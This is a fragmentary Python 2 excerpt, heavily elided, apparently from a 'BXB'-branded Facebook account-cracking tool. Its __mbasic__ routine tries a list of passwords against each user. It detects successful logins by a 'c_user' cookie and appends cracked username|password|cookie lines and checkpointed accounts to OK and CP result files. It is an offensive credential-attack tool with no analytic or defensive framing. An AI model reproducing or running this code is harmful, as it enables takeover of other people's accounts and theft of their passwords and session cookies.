...
def main():
    ...
    if rmss == '':
        ...
        os.system('xdg-open https://github.com/BALOOXH-BRAND')
    elif rmss in ('3', '03'):
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if 'c_user' in ses.cookies.get_dict().keys():
                ...
                print '\r  %s [BXB-OK] %s|%s|%s                 %s' % (H, user, pw, kuki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki,)
                ok.append(wrt)
                open('BXB/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s' % wrt)
                break
                continue
                ...
                try:
                    ...
                    print '\r  %s \x1b[1;91m[BXB-CP] %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('BXB/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                ...
                print '\r  %s \x1b[1;91m[BXB-CP] %s|%s                %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('BXB/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
